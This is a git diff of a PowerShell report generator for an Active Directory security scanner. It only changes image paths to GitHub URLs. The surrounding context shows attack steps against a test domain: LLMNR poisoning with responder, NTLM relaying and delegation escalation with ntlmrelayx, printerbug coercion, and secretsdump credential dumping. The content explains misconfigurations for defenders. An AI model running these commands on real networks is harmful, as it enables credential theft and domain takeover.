@@ -111,7 +111,7 @@ function Generate-MISChtml {
                                             <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M maq</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/MAQ-1.png" alt="Finding the machineaccountquota">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/MAQ-1.png" alt="Finding the machineaccountquota">
                                         </span>
                                     </div>
                                     <hr>
@@ -123,7 +123,7 @@ function Generate-MISChtml {
                                             <p class="code">nxc smb dc.test.local -u 'attackerComputer$' -p 'h4x' --shares</p>          
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/MAQ-2.png" alt="Adding and using the computer account">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/MAQ-2.png" alt="Adding and using the computer account">
                                         </span>
                                     </div>
                                     <hr>
@@ -132,7 +132,7 @@ function Generate-MISChtml {
                                             <p>3. The added computer can be seen joined to the domain.</p>           
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/MAQ-3.png" alt="Viewing the added machine">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/MAQ-3.png" alt="Viewing the added machine">
                                         </span>
                                     </div>
                                 </td>
@@ -233,7 +233,7 @@ function Generate-MISChtml {
                                             <p>1. If unrestricted outbound access is permitted, users can freely access malicious websites such as exploit-db.com.</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/outbound-access-1.png" alt="accessing malicious site">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/outbound-access-1.png" alt="accessing malicious site">
                                         </span>
                                     </div>
                                     <hr>
@@ -242,7 +242,7 @@ function Generate-MISChtml {
                                             <p>2. If outbound access is permitted on servers, whilst malicious sites may be blocked by a proxy solution, an attacker could visit third-party sharing sites such as Dropbox, on the domain controller to exfiltrate high volumes of sensitive data with admin access from the network with ease.</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/outbound-access-2.png" alt="accessing non-essential site">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/outbound-access-2.png" alt="accessing non-essential site">
                                         </span>
                                     </div>
                                 </td>
@@ -324,7 +324,7 @@ function Generate-MISChtml {
                                             <p class="code">nxc smb 192.168.10.0/24 --gen-relay-list smb_hosts_nosigning.txt</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/smbsigning-1.png" alt="finding systems where smb signing is not required">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/smbsigning-1.png" alt="finding systems where smb signing is not required">
                                         </span>
                                     </div>
                                     <hr>
@@ -333,7 +333,7 @@ function Generate-MISChtml {
                                             <p>2. Like in LLMNR poisoning, a user may fail a DNS request by mispelling a file share, which will invoke an LLMNR query to attempt to resolve the hostname on the local LAN.</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/smbsigning-2.png" alt="failing a DNS request">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/smbsigning-2.png" alt="failing a DNS request">
                                         </span>
                                     </div>
                                     <hr>
@@ -343,7 +343,7 @@ function Generate-MISChtml {
                                             <p class="code">sudo responder -I eth0</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/smbsigning-3.png" alt="poisoning the request">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/smbsigning-3.png" alt="poisoning the request">
                                         </span>
                                     </div>
                                     <hr>
@@ -353,7 +353,7 @@ function Generate-MISChtml {
                                             <p class="code">impacket-ntlmrelayx -tf smb_hosts_nosigning.txt -smb2support</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/smbsigning-4.png" alt="relaying the smb authentication">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/smbsigning-4.png" alt="relaying the smb authentication">
                                         </span>
                                     </div>
                                 </td>
@@ -436,7 +436,7 @@ function Generate-MISChtml {
                                                     <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
                                                 </span>
                                             </div>
                                             <hr>
@@ -450,7 +450,7 @@ function Generate-MISChtml {
                                                     <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
                                                 </span>
                                             </div>
                                             <hr>
@@ -460,7 +460,7 @@ function Generate-MISChtml {
                                                     <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
                                                 </span>
                                             </div>
                                             <hr>
@@ -473,7 +473,7 @@ function Generate-MISChtml {
                                                     <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
                                                 </span>
                                             </div>
                                         </td>
@@ -555,7 +555,7 @@ function Generate-MISChtml {
                                             <p class="code">nxc smb dc.test.local -u test -p 'Password123!' -M spooler</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/Spooler-1.png" alt="finding systems where print spooler is enabled">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/Spooler-1.png" alt="finding systems where print spooler is enabled">
                                         </span>
                                     </div>
                                     <hr>
@@ -565,7 +565,7 @@ function Generate-MISChtml {
                                             <p class="code">python3 printerbug.py test:'Password123!'@dc.test.local attacker.test.local</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/Kerberos/unconstrained-4.png" alt="Coercing authentication">
                                         </span>
                                     </div>
                                     <hr>
@@ -575,7 +575,7 @@ function Generate-MISChtml {
                                             <p class="code">sudo responder -I eth0</p>
                                         </div>
                                         <span class="image-cell">
-                                            <img src="/Private/Report/Images/MISC/Spooler-2.png" alt="Retrieving the computer hash">
+                                            <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/Spooler-2.png" alt="Retrieving the computer hash">
                                         </span>
                                     </div>
                                 </td>
@@ -664,7 +664,7 @@ function Generate-MISChtml {
                                                     <p class="code">nxc ldap dc.test.local -u test -p 'Password123!' -M ldap-checker</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-1.png" alt="Finding computers with webclient service enabled">
                                                 </span>
                                             </div>
                                             <hr>
@@ -678,7 +678,7 @@ function Generate-MISChtml {
                                                     <p class="code>python3 printerbug.py test:'Password123!'@192.168.10.205 attackerDNS@8080/a></p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-2.png" alt="Setting up webdav relay">
                                                 </span>
                                             </div>
                                             <hr>
@@ -688,7 +688,7 @@ function Generate-MISChtml {
                                                     <p class="code">sudo impacket-ntlmrelayx -smb2support -t ldaps://dc.test.local --http-port 8080 --delegate-access --escalate-user attackerComputer\$ --no-dump --no-acl --no-da</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-3.png" alt="Relaying webdav">
                                                 </span>
                                             </div>
                                             <hr>
@@ -701,7 +701,7 @@ function Generate-MISChtml {
                                                     <p class="code">impacket-secretsdump -k -no-pass DESKTOP-JKTS35O.test.local</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/webdav-4.png" alt="Compromising the computer">
                                                 </span>
                                             </div>
                                         </td>
@@ -783,7 +783,7 @@ function Generate-MISChtml {
                                                     <p>1. Empty OUs can be found in ADUC where no object exist under the OU. This adds unecessary completiy and risk that misconfigured objects can lie dormant in many sublayers of OUs.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/emptyOU.png" alt="empty OU">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/emptyOU.png" alt="empty OU">
                                                 </span>
                                             </div>
                                         </td>
@@ -865,7 +865,7 @@ function Generate-MISChtml {
                                                     <p>1. Unlinked GPOs can be found under the "scope" tab in the GPMC editor where no links are present.</p>
                                                 </div>
                                                 <span class="image-cell">
-                                                    <img src="/Private/Report/Images/MISC/unlinkedGPO.png" alt="unlinked GPO">
+                                                    <img src="https://raw.githubusercontent.com/rootjaxk/ADScanner/main/Private/Report/Images/MISC/unlinkedGPO.png" alt="unlinked GPO">
                                                 </span>
                                             </div>
                                         </td>
